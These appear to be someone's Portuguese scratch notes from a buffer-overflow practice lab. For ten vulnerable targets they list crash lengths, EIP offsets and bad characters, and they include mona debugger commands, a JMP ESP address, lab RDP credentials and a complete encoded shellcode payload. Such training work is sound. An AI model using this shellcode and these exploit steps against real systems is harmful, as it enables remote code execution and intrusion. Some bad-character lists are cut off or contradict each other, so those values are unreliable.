Maquina Windows 7 32-bits
Credenciais RDP: xfreerdp /u:admin /p:password /cert:ignore /v:10.10.216.217 /workarea

2000 bytes aproximadamente quebram a aplicação

6F43396E
EIP = offset 1978 + "BBBB"

Bad Chars: 00, 07, 08, A1, 2E, 2F, A0
2E = ./
07 2E 2F A0 00
!mona jmp -r esp -cpb "\x00\x07\xA0\x2E"

!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a 01A9FA30

\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
 removendo x07 x08 não é bad char,

625011AF


"\xbd\x77\xc8\x28\x9b\xdb\xce\xd9\x74\x24\xf4\x58\x2b\xc9"
"\xb1\x52\x83\xe8\xfc\x31\x68\x0e\x03\x1f\xc6\xca\x6e\x23"
"\x3e\x88\x91\xdb\xbf\xed\x18\x3e\x8e\x2d\x7e\x4b\xa1\x9d"
"\xf4\x19\x4e\x55\x58\x89\xc5\x1b\x75\xbe\x6e\x91\xa3\xf1"
"\x6f\x8a\x90\x90\xf3\xd1\xc4\x72\xcd\x19\x19\x73\x0a\x47"
"\xd0\x21\xc3\x03\x47\xd5\x60\x59\x54\x5e\x3a\x4f\xdc\x83"
"\x8b\x6e\xcd\x12\x87\x28\xcd\x95\x44\x41\x44\x8d\x89\x6c"
"\x1e\x26\x79\x1a\xa1\xee\xb3\xe3\x0e\xcf\x7b\x16\x4e\x08"
"\xbb\xc9\x25\x60\xbf\x74\x3e\xb7\xbd\xa2\xcb\x23\x65\x20"
"\x6b\x8f\x97\xe5\xea\x44\x9b\x42\x78\x02\xb8\x55\xad\x39"
"\xc4\xde\x50\xed\x4c\xa4\x76\x29\x14\x7e\x16\x68\xf0\xd1"
"\x27\x6a\x5b\x8d\x8d\xe1\x76\xda\xbf\xa8\x1e\x2f\xf2\x52"
"\xdf\x27\x85\x21\xed\xe8\x3d\xad\x5d\x60\x98\x2a\xa1\x5b"
"\x5c\xa4\x5c\x64\x9d\xed\x9a\x30\xcd\x85\x0b\x39\x86\x55"
"\xb3\xec\x09\x05\x1b\x5f\xea\xf5\xdb\x0f\x82\x1f\xd4\x70"
"\xb2\x20\x3e\x19\x59\xdb\xa9\x2c\x96\xb5\x1e\x59\xa4\x39"
"\x70\xc5\x21\xdf\x18\xe5\x67\x48\xb5\x9c\x2d\x02\x24\x60"
"\xf8\x6f\x66\xea\x0f\x90\x29\x1b\x65\x82\xde\xeb\x30\xf8"
"\x49\xf3\xee\x94\x16\x66\x75\x64\x50\x9b\x22\x33\x35\x6d"
"\x3b\xd1\xab\xd4\x95\xc7\x31\x80\xde\x43\xee\x71\xe0\x4a"
"\x63\xcd\xc6\x5c\xbd\xce\x42\x08\x11\x99\x1c\xe6\xd7\x73"
"\xef\x50\x8e\x28\xb9\x34\x57\x03\x7a\x42\x58\x4e\x0c\xaa"
"\xe9\x27\x49\xd5\xc6\xaf\x5d\xae\x3a\x50\xa1\x65\xff\x70"
"\x40\xaf\x0a\x19\xdd\x3a\xb7\x44\xde\x91\xf4\x70\x5d\x13"
"\x85\x86\x7d\x56\x80\xc3\x39\x8b\xf8\x5c\xac\xab\xaf\x5d"
"\xe5"

**OVERFLOW2**

Fuzzing
A aplicação quebra com 700 bytes aproximadamente.

Para aintigir EIP 634 bytes

Bad Chars
x00\x07\x08\xa1\x0

23, 83, BA, 3C, 
\x23\x83\xBA\x3C

\x00\x23\x83\xBA\x3C

**OVERFLOW3**

Fazendo um Fuzzing descobrimos que a aplicação quebra com aproximadamente:
	1300 bytes
Agora descobrir com quantos bytes atingimos EIP
 1272 + 23 = 1295
 offset 1274

BadChars
\x00\x11\x40\xB8\xEE\x5F
\x00\x11\x40\x5F\xEE

**OVERFLOW4**

Fazendo fuzzing a aplicação quebra com 2100 bytes.
Seu EIP está é atingido em 2026 bytes

\x00\xD4\xA9\xCD\x

**OVERFLOW5**

Fazendo fuzzing a aplicação quebra com 400 bytes
Seu EIP é atingido com 314 bytes

BadChars:
	\x00\xF4\x16\xFD
 \x2F

**OVERFLOW6**

Com o Fuzzing a aplicação quebra com 1100 bytes
O EIP é atingido com 1034 bytes

\x00\x08\x2C\xAD\x

**OVERFLOW7**

Fuzzing 1400 bytes
EIP 1306 bytes
BadChars \x00\x8C\xAE\xBE\xFB\x

**OVERFLOW8

Fuzzing 1800 bytes
EIP 1786 bytes
BadChars: \x00\x1D\x2E\xC7\xEE

**OVERFLOW9

Fuzzing 1600 bytes
EIP 1514 bytes
BadChars: \x00\x04\x3E\xE1

**OVERFLOW10

Fuzzing 600 bytes
EIP 537 bytes
BadChars: \x00\xAD\xBE\xDE\xA0\xEF

